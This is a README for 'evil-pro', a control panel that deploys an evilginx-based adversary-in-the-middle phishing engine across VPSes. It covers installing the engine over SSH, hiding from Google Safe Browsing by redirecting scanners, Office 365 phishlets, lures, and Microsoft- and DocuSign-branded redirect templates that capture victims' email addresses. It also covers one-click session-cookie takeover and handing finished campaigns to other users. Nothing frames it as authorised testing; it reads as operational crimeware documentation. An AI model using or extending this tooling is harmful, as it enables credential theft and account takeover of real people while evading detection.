# evil-pro Control Panel

A **separate, local** application that deploys and manages the evil-pro engine on
one or many VPSes over SSH. This is *not* the per-server Dashboard.

| | Control Panel (this app) | Dashboard (in the engine) |
|---|---|---|
| Runs on | your machine (or a small host) | the VPS, inside evilginx |
| Who uses it | you (operator/admin) | whoever views captures |
| Purpose | install / update / manage servers, hand-off | view sessions, one-click cookie takeover |
| URL | `http://127.0.0.1:8080` | `http://VPS_IP:5000` / `https://panel.<domain>` |
| Auth | panel user/pass | deployment user/pass |

---

## 0. Portable folder (the easy way)

```bash
build-portable.bat          # assembles dist/evil-pro-control-panel/
```

That folder is **self-contained** — copy it to any Windows/Linux/macOS machine and:

1. Windows: double-click **START.bat**  ·  Linux/macOS: `chmod +x START.sh && ./START.sh`
2. First run asks for the **listen address**, **username** and **password** (press Enter for defaults)
3. The browser opens the panel

Change the port/login any time with **SETUP.bat**, or inside the panel under
**Settings → Panel login & port** (then *Restart panel*). If the port is taken the
panel automatically moves to the next free one and prints it.

Contains: `evilpro-panel*` + `evilginx-linux{,-arm64}` (the engine it deploys) +
`phishlets/` + `extension/` + `panel.json` (your settings and saved servers —
passwords in plain text, keep it safe).

## 1. Build from source

```bash
# Windows
build-portable.bat        # everything, into dist/
build-panel.bat           # dev: build\ only

# Linux / macOS
./build-panel.sh
```

Requires Go 1.25+. Uses the vendored deps (no network).

## 2. Run without the portable folder (dev)

```bash
# Windows
panel.bat                 # http://127.0.0.1:8080

# Linux / macOS
./panel.sh
```

Flags / env:

| Flag | Env | Default | Notes |
|---|---|---|---|
| `-bind` | — | `panel.json` or `127.0.0.1:8080` | use `0.0.0.0:8080` when hosting |
| `-user` | — | `admin` | |
| `-pass` | — | *(empty = no login)* | set one before hosting |
| `-setup` | — | | interactive first-run setup |
| `-repo` | — | this folder | where `evilginx-linux` + `phishlets/` live |
| `-open` | — | `true` | open the browser |
| `-tls-cert` / `-tls-key` | — | | optional HTTPS |

Settings and servers are stored in `panel.json` next to the binary (portable).
A missing password means **no login** — fine on `127.0.0.1`, set one if you bind
to the network.

## 3. Add a server

Click **Add server** and fill in:

| Field | Example |
|---|---|
| Name | `campaign-a` |
| Host / IP | `203.0.113.10` |
| User | `root` (sudo works too) |
| Auth | password **or** SSH key file |
| Base domain | `yoursite.com` |
| Phishlet | `o365new` |
| Dashboard sub | `panel` |
| Dashboard user / pass | `admin` / *(auto-generated if blank)* |

Optional: a **Cloudflare API token** (`Zone:DNS:Edit`) enables automatic `A @`
and `A *` records and a **wildcard certificate** via DNS‑01.

Click **Test connection** to verify. The server's SSH host key is pinned on first
connect (TOFU) and checked afterwards.

## 4. Install

Click **Install**. The panel connects over SSH and, in one idempotent pass:

1. installs `curl/ufw/certbot` as needed
2. frees port 53 (disables `systemd-resolved`) and opens the firewall (22/53/80/443/5000 + Telegram egress)
3. creates `/root/evilginx2/{build,cfg,phishlets}`
4. uploads the engine (gzip+base64, arch-matched), phishlets, a landing page and a systemd unit
5. writes a hardened `config.json` (anti‑GSB: scanner 302 → real login, `unauth_redirect`, `strip_headers`, `unauth_url`)
6. optionally creates Cloudflare `A`/`A*` records and issues a **wildcard cert** (auto-renew hook installed)
7. starts the service and **verifies** it (service active, ports, a scanner probe returning `302 → login.microsoftonline.com`)

Every step streams into a live log. Failures stop the job with the exact command output.

> DNS must already point the domain (and `*`) at the server, or use the
> Cloudflare option. TLS otherwise relies on ACME per‑host certificates.

## 4a. Adopt an existing server (no reinstall)

If evil-pro is already running on a VPS (deployed earlier, by hand, or from another
machine), you do **not** need to reinstall it:

1. **Add server** → host, SSH port, user, password (or key). Domain can stay blank.
2. Save, then click **Scan** (or **Connect**).
3. The panel SSHes in, locates the install (systemd unit → install dir, config,
   certificate, service state) and shows what it found: domain, phishlet,
   dashboard login, ports, certificate and whether the engine API is reachable.
4. Click **Adopt this server** — nothing on the VPS is touched; the panel just
   imports the settings (including the engine's dashboard credentials) so
   **Manage** works immediately.

**Repair config** re-applies the essentials (phishlet bound to the domain and
enabled, anti-GSB flags) and restarts — useful if something rewrote the config.

Related behaviour:

- `Update` never overwrites an existing `config.json` unless you tick *fresh*.
- install / update / repair read the server's own dashboard credentials back into
  the profile, so Manage never 401s after a reconnect.
- A 401 from the engine makes the panel re-read the credentials and retry once.
- VPS rebuilt and the host key changed → **Edit → clear pinned host key**.

## 5. Daily use

Per server card:

| Action | What it does |
|---|---|
| **Update** | re-uploads the current engine binary, normalises the config, restarts, verifies |
| **Hand-off** | dashboard link(s) + login + lure link + extension download, ready to give to a user |
| **Status** | service state, listening ports, version, certificate expiry |
| **Logs** | last N lines of `journalctl -u evilginx` |
| **Restart / Start / Stop** | service control (restart also normalises the config) |
| **Edit** | connection, deployment, Cloudflare, Telegram and notes |
| **Uninstall** | stops + disables the service (keeps the config) |
| **Delete** | removes the profile from the panel (the VPS is untouched) |

**History is kept** in `Activity` for every job.

## 5a. Manage a server (full console)

**Manage** opens the per-server console. Everything that used to live in the
Dashboard now lives here — it drives the remote engine over its API
(`http://host:5000/api/v1/...`, or the `engine_url` you set in Edit), with the
profile's dashboard credentials:

| Tab | What you can do |
|---|---|
| Sessions | browse, open, one-click takeover, export |
| Phishlets | enable/disable, hide/unhide, hostname, per-phishlet `unauth_url`, reload, YAML, DNS, reload-all |
| Lures | create (incl. encrypted URL params), edit every field, clone, pause/resume, delete |
| Autolures | create (fixed/random interval), live countdown, notify toggle, delete |
| Redirects | template gallery with live preview, create with target + delay + Turnstile placement/type/theme, **branding**, edit, delete |
| Blacklist | mode, add/remove IPs |
| Settings | engine config, Telegram/GoPhish tests, Turnstile keys, cert re-provision |
| Logs | engine service state + `journalctl` |

The Dashboard stays Sessions-only on purpose: end users never touch engine config.

`engine_url` (Edit → Deployment) defaults to `http://<host>:5000`; set it to
`https://panel.<domain>` if you prefer TLS or if :5000 is filtered.

## 5b. Branding a redirect template

Any redirect built from a template can be re-branded without touching the file:
**Redirects → New** (or **Edit** on a row). Fields:

| Field | Effect |
|---|---|
| Brand / wordmark | the label next to the logo |
| Title / Subtitle | the headline text |
| Logo | `mark`, `microsoft`, `docusign`, `cloud`, `file`, `ring`, `none`, or an image URL |
| Accent | hex colour used by the buttons/spinners/progress |
| Button label | used by templates that show a button |
| Status lines | one per line — the rotating status text |

The preview iframe refreshes as you type. Values are stored per page and applied at
serve time, so editing is instant (no file rewrite) and empty fields fall back to
the template default.

### Bundled templates

| Template | Shape |
|---|---|
| `clean-redirect` | minimal page with a slim progress bar |
| `ms-spinner` / `ms-loading` | Microsoft-flavoured loading screens |
| `docusign-redirect` / `generic-signing` | "you have a document to sign" |
| `doc-preview` / `file-viewer` | document preview / viewer chrome |
| `generic-progress` | neutral progress page |
| `file-signin` | two-step: a file "prepares", then the card flips to a Microsoft sign-in |

**`file-signin` notes.** It collects the address the victim types and appends it to
the target as `?login_hint=<email>`, so Microsoft prefills the field and the phish
looks continuous. Point its target at the **lure path** (e.g.
`https://login.<domain>/auth/login`): the engine forwards the query string across
the lure → login redirect, so the hint reaches Microsoft intact. Bots still get a
plain `302` and never render the page.

## 6. Config self-healing

`ensureConfig()` runs on install, update and restart. It never overwrites a value
that is already set, but it fills in anything missing/wrong that would break the
deployment:

- engine `domain` (if empty)
- `unauth_redirect`, `strip_headers`, `unauth_url` (anti‑GSB defaults)
- the phishlet's `hostname` (bound to the profile domain) and `enabled: true`
- `dashboard_sub` (from the profile)

This repairs the common "someone ran a stray interactive `evilginx` and it
rewrote the config" drift.

## 7. Update workflow (typical)

1. Change code.
2. `build-panel.bat` (or `./build-panel.sh`).
3. Open the panel → **Update** on the affected server.
4. Watch the log; the job finishes with a hand-off summary.

## 8. Hosting it later

```bash
PANEL_BIND=0.0.0.0:8080 PANEL_PASS='something-strong' ./panel.sh
```

Put it behind the TLS you prefer (Caddy/nginx or `-tls-cert`/`-tls-key`). It is a
single self-contained binary with no external assets.

## 9. Security notes

- Panel credentials are a single user/pass; host-key pinning is on.
- Profile passwords/keys and the Cloudflare token are stored **plaintext** in
  `profiles.json` (mode 0600) on your machine.
- The engine is left exactly as hardened for anti‑GSB; the panel never disables
  scanner cloaking.

## 10. API (for scripting)

All endpoints require the panel user/pass (Basic or the `ep_cp_session` cookie).

```
GET    /api/state
GET    /api/profiles
POST   /api/profiles
GET    /api/profiles/{id}
DELETE /api/profiles/{id}
POST   /api/profiles/{id}/test
GET    /api/profiles/{id}/status
POST   /api/profiles/{id}/install   {harden,fresh,with_cf,with_cert,telegram}
POST   /api/profiles/{id}/update
POST   /api/profiles/{id}/action    {action:start|stop|restart|...}
POST   /api/profiles/{id}/uninstall
GET    /api/profiles/{id}/logs?lines=300
GET    /api/profiles/{id}/handoff
GET    /api/jobs      /  GET /api/jobs/{id}
GET    /api/extension.zip
POST   /api/settings  /  POST /api/build  /  POST /api/cf/verify
```

Example:

```bash
curl -u admin:PASS -X POST -H 'Content-Type: application/json' \
  -d '{"name":"campaign-a","host":"203.0.113.10","user":"root","password":"...","domain":"yoursite.com","phishlet":"o365new"}' \
  http://127.0.0.1:8080/api/profiles
```
